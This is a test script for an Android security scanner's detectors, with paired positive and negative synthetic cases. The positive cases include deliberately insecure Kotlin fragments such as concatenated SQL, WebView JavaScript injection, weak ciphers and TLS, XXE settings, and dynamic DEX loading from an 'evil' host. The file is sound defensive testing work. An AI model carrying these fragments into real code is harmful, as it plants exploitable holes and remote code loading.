#!/usr/bin/env bun
// 检测器精度冒烟（②——test-detectors.ts）。
// 核心检测器的正/负用例验证：每个检测器用合成样本逐项验证「应命中命中、应不命中不命中」——
// 失败即非零退出（CI 门禁）——保持「确认后才报」的精度。
//
// 用法：
//   bun scripts/test-detectors.ts
import { matchCustomRules, parseCustomRules } from "../src/core/custom-rules.ts"
import { buildPermissionRiskFindings, linkPermissionDataflow } from "../src/core/permission-risk.ts"
import { buildMastgChecklist, mastgComplianceSummary } from "../src/core/mastg-checklist.ts"
import { buildHardeningSuggestions } from "../src/core/report.ts"
import { matchBehaviorRules } from "../src/core/behavior-rules.ts"
import { compareKnownVulnerabilities } from "../src/core/known-vulnerabilities.ts"
import { scanCollectionTaint } from "../src/core/collection-taint.ts"
import { scanSourceDetectors } from "../src/core/source-detectors.ts"
import { extractEndpoints } from "../src/core/endpoint-extract.ts"
import { mkdtemp, writeFile, mkdir } from "node:fs/promises"
import { tmpdir } from "node:os"
import path from "node:path"

// 构造合成源码目录（供 scanSourceDetectors 的正/负用例）。
async function makeSourceDir(source: string): Promise<string> {
  const dir = await mkdtemp(path.join(tmpdir(), "det-"))
  await mkdir(path.join(dir, "src"), { recursive: true })
  await writeFile(path.join(dir, "src", "Main.kt"), source, "utf8")
  return dir
}

interface Case {
  name: string
  run: () => { hit: boolean; detail: string } | Promise<{ hit: boolean; detail: string }>
}

const cases: Case[] = [
  {
    name: "自定义规则命中(正)",
    run: () => {
      const rules = parseCustomRules(JSON.stringify([{ code: "TEST_KEY", title: "测试", severity: "high", pattern: "api[_-]?key\\s*=\\s*[\"'][^\"']{12,}[\"']", scope: "source" }]))
      const hits = matchCustomRules(rules, ["const api_key = \"AIzaSyA123456789012345678901234567\""], "source")
      return { hit: hits.length > 0, detail: `命中 ${hits.length} 条（应 1）` }
    },
  },
  {
    name: "自定义规则不命中(负)",
    run: () => {
      const rules = parseCustomRules(JSON.stringify([{ code: "TEST_KEY", title: "测试", severity: "high", pattern: "api[_-]?key\\s*=\\s*[\"'][^\"']{12,}[\"']", scope: "source" }]))
      const hits = matchCustomRules(rules, ["const api_key = config.get(\"key\")"], "source")
      return { hit: hits.length === 0, detail: `误报 ${hits.length} 条（应 0）` }
    },
  },
  {
    name: "权限风险评分(正)",
    run: () => {
      const findings = buildPermissionRiskFindings(["android.permission.RECEIVE_SMS"])
      return { hit: findings.length > 0 && findings[0]!.code === "PERMISSION_RISK_HIGH", detail: `风险评分 ${findings.length > 0 ? findings[0]!.title : "无"}（应有）` }
    },
  },
  {
    name: "权限风险评分(负)",
    run: () => {
      const findings = buildPermissionRiskFindings(["android.permission.INTERNET"])
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 条（应 0——INTERNET 非敏感）` }
    },
  },
  {
    name: "权限-数据流关联(正)",
    run: () => {
      const links = linkPermissionDataflow(["android.permission.READ_PHONE_STATE"], [{ code: "SOURCE_DATAFLOW", severity: "medium", title: "t", detail: "d", recommendation: "r", evidence: "getDeviceId() → Log.d" }])
      return { hit: links.length > 0 && links[0]!.code === "PERMISSION_DATAFLOW_LINK", detail: `关联 ${links.length} 条（应 1）` }
    },
  },
  {
    name: "权限-数据流关联(负)",
    run: () => {
      const links = linkPermissionDataflow(["android.permission.READ_PHONE_STATE"], [{ code: "SOURCE_DATAFLOW", severity: "medium", title: "t", detail: "d", recommendation: "r", evidence: "getString() → setText()" }])
      return { hit: links.length === 0, detail: `误报 ${links.length} 条（应 0——无对应源/汇）` }
    },
  },
  {
    name: "MASTG 清单状态推导(正)",
    run: () => {
      const checklist = buildMastgChecklist([{ code: "SOURCE_SSL_BYPASS", severity: "high", title: "t", detail: "d", recommendation: "r" }])
      const item = checklist.find((i) => i.id === "MASTG-NETWORK-2")
      return { hit: item?.status === "需核验", detail: `MASTG-NETWORK-2 状态 ${item?.status}（应 需核验）` }
    },
  },
  {
    name: "MASTG 清单状态推导(负)",
    run: () => {
      const checklist = buildMastgChecklist([{ code: "UNRELATED", severity: "low", title: "t", detail: "d", recommendation: "r" }])
      const item = checklist.find((i) => i.id === "MASTG-NETWORK-2")
      return { hit: item?.status === "未检查", detail: `MASTG-NETWORK-2 状态 ${item?.status}（应 未检查）` }
    },
  },
  {
    name: "加固建议生成(正)",
    run: () => {
      const suggestions = buildHardeningSuggestions([{ code: "SOURCE_HARDCODED_SECRET", severity: "high", title: "t", detail: "d", recommendation: "r" }])
      return { hit: suggestions.length > 0 && suggestions[0]!.type === "源码敏感串", detail: `建议 ${suggestions.length} 条（应 1）` }
    },
  },
  {
    name: "加固建议生成(负)",
    run: () => {
      const suggestions = buildHardeningSuggestions([{ code: "SOURCE_SSL_BYPASS", severity: "high", title: "t", detail: "d", recommendation: "r" }])
      return { hit: suggestions.length === 0, detail: `误报 ${suggestions.length} 条（应 0——非敏感串发现）` }
    },
  },
  {
    name: "行为规则命中(正——短信劫持)",
    run: () => {
      const hits = matchBehaviorRules(new Set(["android.telephony.SmsManager.sendTextMessage"]))
      return { hit: hits.some((h) => h.rule.crimer === "sms-hijack"), detail: `命中 ${hits.length} 条（应含 sms-hijack）` }
    },
  },
  {
    name: "行为规则命中(正——勒索加密)",
    run: () => {
      const hits = matchBehaviorRules(new Set(["javax.crypto.Cipher.doFinal"]))
      return { hit: hits.some((h) => h.rule.crimer === "ransom-encrypt"), detail: `命中 ${hits.length} 条（应含 ransom-encrypt）` }
    },
  },
  {
    name: "行为规则不命中(负——正常调用)",
    run: () => {
      const hits = matchBehaviorRules(new Set(["android.widget.TextView.setText"]))
      return { hit: hits.length === 0, detail: `误报 ${hits.length} 条（应 0——正常 UI 调用）` }
    },
  },
  {
    name: "供应链快照比对(正——okhttp)",
    run: () => {
      const findings = compareKnownVulnerabilities(["com.squareup.okhttp3:okhttp"])
      return { hit: findings.some((f) => f.code === "SUPPLYCHAIN_KNOWN_VULNERABILITY"), detail: `命中 ${findings.length} 条（应含 okhttp CVE-2021-0341）` }
    },
  },
  {
    name: "供应链快照比对(负——未知组件)",
    run: () => {
      const findings = compareKnownVulnerabilities(["com.example:custom-sdk"])
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 条（应 0——未知组件）` }
    },
  },
  {
    name: "集合污点命中(正——put→get→汇)",
    run: () => {
      const flows = scanCollectionTaint("String d = getDeviceId(); list.put(\"k\", d);\nString v = list.get(\"k\"); Log.d(\"t\", v);")
      return { hit: flows.length > 0, detail: `流 ${flows.length} 条（应有——put 敏感 → get → 汇）` }
    },
  },
  {
    name: "集合污点不命中(负——put 但无汇)",
    run: () => {
      const flows = scanCollectionTaint("String d = getDeviceId(); list.put(\"k\", d);")
      return { hit: flows.length === 0, detail: `误报 ${flows.length} 条（应 0——put 但无 get→汇）` }
    },
  },
  {
    name: "源码检测器命中(正——日志/WebView/RSA)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { Log.d(\"token\", \"secret-1\"); w.settings.setAllowFileAccess(true); KeyPairGenerator.getInstance(\"RSA\").initialize(1024) } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_LOG_SENSITIVE") && codes.includes("SOURCE_WEBVIEW_FILE_ACCESS") && codes.includes("SOURCE_INSECURE_RSA"), detail: `命中 ${findings.length} 类（应含 日志/WebView/RSA）` }
    },
  },
  {
    name: "源码检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val kp = KeyPairGenerator.getInstance(\"RSA\"); kp.initialize(2048); val r = SecureRandom() } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——2048 位 RSA + SecureRandom——安全）` }
    },
  },
  {
    name: "②c 检测器命中(正——ECB/反序列化/剪贴板)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\"); val ois = ObjectInputStream(null); val cm = ClipboardManager(); cm.setPrimaryClip(ClipData.newPlainText(\"k\", \"password-1\")) } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_ECB_CIPHER_USAGE") && codes.includes("SOURCE_DESERIALIZATION_UNSAFE") && codes.includes("SOURCE_CLIPBOARD_SENSITIVE"), detail: `命中 ${findings.length} 类（应含 ECB/反序列化/剪贴板）` }
    },
  },
  {
    name: "②c 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val c = Cipher.getInstance(\"AES/GCM/NoPadding\"); val j = JSONObject() } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——GCM + JSON——安全）` }
    },
  },
  {
    name: "②d 检测器命中(正——反射/有序广播/账户认证)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { Class.forName(\"com.x.Y\").getMethod(\"run\"); sendOrderedBroadcast(intent, null, null, null, 0, \"token-abc\", null); AccountManager.am.addAccountExplicitly(acct, \"password-1\", null) } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_REFLECTION_UNRESTRICTED") && codes.includes("SOURCE_BROADCAST_ORDERED_SENSITIVE") && codes.includes("SOURCE_ACCOUNT_AUTH_SENSITIVE"), detail: `命中 ${findings.length} 类（应含 反射/有序广播/账户认证）` }
    },
  },
  {
    name: "②d 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val r = SecureRandom(); val j = JSONObject(); val c = Cipher.getInstance(\"AES/GCM/NoPadding\") } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——普通前台服务+版本检查——安全）` }
    },
  },
  {
    name: "端点提取命中(正——URL 提取)",
    run: () => {
      const endpoints = extractEndpoints(["https://api.example.com/v1/users?id=1", "https://cdn.example.net/static/app.js"])
      return { hit: endpoints.length >= 2, detail: `提取 ${endpoints.length} 个端点（应 ≥2——api.example.com + cdn.example.net）` }
    },
  },
  {
    name: "端点提取不命中(负——无 URL)",
    run: () => {
      const endpoints = extractEndpoints(["plain text without urls", "another line"])
      return { hit: endpoints.length === 0, detail: `误报 ${endpoints.length} 个（应 0——无 URL）` }
    },
  },
  {
    name: "②e 检测器命中(正——DB 密码/XXE/IV 复用)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { SQLiteDatabase.openDatabase(\"db\", \"pass123\", null, 0); val f = DocumentBuilderFactory.newInstance(); f.setFeature(\"http://xml.org/sax/features/external-general-entities\", true); val iv = \"0123456789ABCDEF\" } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_DB_PASSWORD_PLAINTEXT") && codes.includes("SOURCE_XML_XXE_RISK") && codes.includes("SOURCE_IV_REUSE"), detail: `命中 ${findings.length} 类（应含 DB 密码/XXE/IV 复用）` }
    },
  },
  {
    name: "②e 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val c = Cipher.getInstance(\"AES/GCM/NoPadding\"); val r = SecureRandom(); val bytes = r.nextBytes(16) } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——GCM + SecureRandom——安全）` }
    },
  },
  {
    name: "已有检测器抽查(正——行为勒索规则)",
    run: () => {
      const hits = matchBehaviorRules(new Set(["javax.crypto.Cipher.doFinal", "android.app.admin.DevicePolicyManager.wipeData"]))
      return { hit: hits.some((h) => h.rule.crimer === "ransom-encrypt") && hits.some((h) => h.rule.crimer === "ransom-wipe"), detail: `命中 ${hits.length} 条（应含 勒索加密+擦除）` }
    },
  },
  {
    name: "②f 检测器命中(正——SQL/JS 注入/动态 DEX)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { db.execSQL(\"SELECT * FROM t WHERE id = \" + id); webView.loadUrl(\"javascript:\" + payload); DexClassLoader(\"http://evil/x.dex\", null, null, cl) } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_SQL_INJECTION_SRC") && codes.includes("SOURCE_JS_INJECTION_SRC") && codes.includes("SOURCE_DEX_EXEC_DYNAMIC"), detail: `命中 ${findings.length} 类（应含 SQL/JS 注入/动态 DEX）` }
    },
  },
  {
    name: "②f 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { db.rawQuery(\"SELECT * FROM t WHERE id = ?\", arrayOf(id)); webView.loadUrl(\"https://ok.example.com/page\") } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——参数化 SQL + HTTPS——安全）` }
    },
  },
  {
    name: "已有检测器抽查(正——行为静默安装规则)",
    run: () => {
      const hits = matchBehaviorRules(new Set(["android.content.pm.PackageInstaller.install"]))
      return { hit: hits.some((h) => h.rule.crimer === "rogue-install"), detail: `命中 ${hits.length} 条（应含 静默安装——流氓推广）` }
    },
  },
  {
    name: "②g 检测器命中(正——OTP 日志/设备管理/ADB 备份)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { Log.d(\"otp\", \"123456\"); val dpm = DevicePolicyManager(); dpm.lockNow(); val m = \"android:allowBackup=true\" } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_OTP_LOG") && codes.includes("SOURCE_DEVICE_ADMIN_ABUSE") && codes.includes("SOURCE_ADB_BACKUP_ALLOWED"), detail: `命中 ${findings.length} 类（应含 OTP 日志/设备管理/ADB 备份）` }
    },
  },
  {
    name: "②g 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val m = \"android:allowBackup=false\"; val r = SecureRandom(); val c = Cipher.getInstance(\"AES/GCM/NoPadding\") } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——allowBackup=false + GCM——安全）` }
    },
  },
  {
    name: "已有检测器抽查(正——供应链 commons-collections)",
    run: () => {
      const findings = compareKnownVulnerabilities(["org.apache.commons:commons-collections"])
      return { hit: findings.some((f) => f.code === "SUPPLYCHAIN_KNOWN_VULNERABILITY" && (f.evidence ?? "").includes("CVE-2015-7501")), detail: `命中 ${findings.length} 条（应含 commons-collections CVE-2015-7501）` }
    },
  },
  {
    name: "②h 检测器命中(正——SHA1 签名/SSLContext 弱/自动短信)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val s = Signature.getInstance(\"SHA1withRSA\"); val sc = SSLContext.getInstance(\"TLSv1\"); SmsManager.getDefault().sendTextMessage(\"10086\", null, \"msg\", null, null) } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_SHA1_FOR_SIGNATURE") && codes.includes("SOURCE_SSL_CONTEXT_WEAK") && codes.includes("SOURCE_SMS_SEND_AUTO"), detail: `命中 ${findings.length} 类（应含 SHA1 签名/SSLContext 弱/自动短信）` }
    },
  },
  {
    name: "②h 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val s = Signature.getInstance(\"SHA256withRSA\"); val sc = SSLContext.getInstance(\"TLSv1.2\"); val r = SecureRandom() } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——SHA256withRSA + TLSv1.2——安全）` }
    },
  },
  {
    name: "已有检测器抽查(正——供应链 okhttp)",
    run: () => {
      const findings = compareKnownVulnerabilities(["com.squareup.okhttp3:okhttp"])
      return { hit: findings.some((f) => f.code === "SUPPLYCHAIN_KNOWN_VULNERABILITY" && (f.evidence ?? "").includes("CVE-2021-0341")), detail: `命中 ${findings.length} 条（应含 okhttp CVE-2021-0341）` }
    },
  },
  {
    name: "②i 检测器命中(正——RSA 无填充/密钥存偏好/gRPC 明文)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val c = Cipher.getInstance(\"RSA/ECB/NoPadding\"); getSharedPreferences(\"prefs\", 0).putString(\"aes_key\", \"secret-key\"); ManagedChannelBuilder.forAddress(\"h\", 80).usePlaintext() } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_RSA_NO_PADDING") && codes.includes("SOURCE_KEY_IN_PREFERENCES") && codes.includes("SOURCE_GRPC_PLAINTEXT"), detail: `命中 ${findings.length} 类（应含 RSA 无填充/密钥存偏好/gRPC 明文）` }
    },
  },
  {
    name: "②i 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val c = Cipher.getInstance(\"RSA/ECB/OAEPWithSHA-256AndMGF1Padding\"); val r = SecureRandom(); ManagedChannelBuilder.forAddress(\"h\", 443).useTransportSecurity() } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——RSA OAEP + gRPC TLS——安全）` }
    },
  },
  {
    name: "已有检测器抽查(正——行为静默下载规则)",
    run: () => {
      const hits = matchBehaviorRules(new Set(["android.app.DownloadManager.enqueue"]))
      return { hit: hits.some((h) => h.rule.crimer === "rogue-download"), detail: `命中 ${hits.length} 条（应含 静默下载——流氓推广）` }
    },
  },
  {
    name: "②j 检测器命中(正——DB 外部/SD 卡执行/Intent Parcel)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { getExternalFilesDir(null).let { SQLiteDatabase.openOrCreateDatabase(it, null, null) }; DexClassLoader(\"/mnt/sdcard/x.dex\", null, null, cl); intent.putExtra(\"token\", \"secret-tok\") } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_DB_WRITE_EXTERNAL") && codes.includes("SOURCE_SDCARD_EXEC") && codes.includes("SOURCE_INTENT_PARCEL_SENSITIVE"), detail: `命中 ${findings.length} 类（应含 DB 外部/SD 卡执行/Intent Parcel）` }
    },
  },
  {
    name: "②j 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val db = SQLiteDatabase.openDatabase(\"internal.db\", null, 0); val r = SecureRandom(); intent.putExtra(\"id\", 42) } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——内部 DB + 非敏感 extra——安全）` }
    },
  },
  {
    name: "②k 检测器命中(正——支付敏感/生物识别密钥/WebView 缓存)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { BillingClient.newBuilder(ctx).build(); onPurchasesUpdated(); val kb = KeyGenParameterSpec.Builder(\"k\", 3); kb.setUserAuthenticationRequired(false); webView.settings.setCacheMode(LOAD_CACHE_ELSE_NETWORK); cache.put(\"token\", \"secret-1\") } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_PAYMENT_SENSITIVE") && codes.includes("SOURCE_BIOMETRIC_KEY_INSECURE") && codes.includes("SOURCE_WEBVIEW_CACHE_SENSITIVE"), detail: `命中 ${findings.length} 类（应含 支付敏感/生物识别密钥/WebView 缓存）` }
    },
  },
  {
    name: "②k 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { val kb = KeyGenParameterSpec.Builder(\"k\", 3); kb.setUserAuthenticationRequired(true); webView.settings.setCacheMode(LOAD_DEFAULT) } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——生物识别认证 + 默认缓存——安全）` }
    },
  },
  {
    name: "已有检测器抽查(正——行为广告欺诈规则)",
    run: () => {
      const hits = matchBehaviorRules(new Set(["android.view.View.setVisibility"]))
      return { hit: hits.some((h) => h.rule.crimer === "ad-fraud-hide"), detail: `命中 ${hits.length} 条（应含 广告欺诈——隐藏视图）` }
    },
  },
  {
    name: "②l 检测器命中(正——PendingIntent/盐硬编码/剪贴板读取)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { PendingIntent.getActivity(ctx, 0, i, FLAG_MUTABLE); val salt = \"AbCdEfGhIjKlMnOp\"; val secret = ClipboardManager.getPrimaryClip().getText() } }")
      const findings = await scanSourceDetectors(dir)
      const codes = findings.map((f) => f.code)
      return { hit: codes.includes("SOURCE_PENDING_INTENT_INSECURE") && codes.includes("SOURCE_CRYPTO_SALT_HARDCODED") && codes.includes("SOURCE_CLIPBOARD_READ_SENSITIVE"), detail: `命中 ${findings.length} 类（应含 PendingIntent/盐硬编码/剪贴板读取）` }
    },
  },
  {
    name: "②l 检测器不命中(负——安全代码)",
    run: async () => {
      const dir = await makeSourceDir("class A { fun x() { PendingIntent.getActivity(ctx, 0, i, FLAG_IMMUTABLE); val r = SecureRandom(); val b = ByteArray(16); r.nextBytes(b) } }")
      const findings = await scanSourceDetectors(dir)
      return { hit: findings.length === 0, detail: `误报 ${findings.length} 类（应 0——IMMUTABLE + SecureRandom——安全）` }
    },
  },
  {
    name: "已有检测器抽查(正——行为呼叫欺诈规则)",
    run: () => {
      const hits = matchBehaviorRules(new Set(["android.telecom.TelecomManager.acceptRingingCall"]))
      return { hit: hits.some((h) => h.rule.crimer === "call-answer"), detail: `命中 ${hits.length} 条（应含 呼叫欺诈——自动接听）` }
    },
  },
]

let failed = 0
for (const testCase of cases) {
  const result = await testCase.run()
  const ok = result.hit
  if (!ok) failed += 1
  console.log(`${ok ? "✓" : "✗"} ${testCase.name}：${result.detail}`)
}
console.log(`\n检测器冒烟：${cases.length - failed}/${cases.length} 通过`)
if (failed > 0) process.exitCode = 1
